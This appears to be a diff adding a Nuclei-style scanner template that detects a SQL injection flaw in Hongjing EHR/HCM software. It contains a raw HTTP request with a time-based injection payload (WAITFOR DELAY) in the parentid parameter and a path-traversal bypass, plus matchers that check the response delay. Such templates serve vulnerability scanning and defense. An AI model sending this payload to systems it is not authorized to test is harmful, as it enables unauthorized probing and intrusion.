@@ -1,0 +1,28 @@
+id: hongjing-parentid-sqli
+
+info:
+  name: hongjing-parentid-sqli
+  author: apple
+  severity: high
+  description: Hongjing-ehr-hcm has sql injection vulnerabilit
+  reference:
+    - https://github.com/willchen0011/cve/blob/main/HongJing-sql.md
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+        condition: and
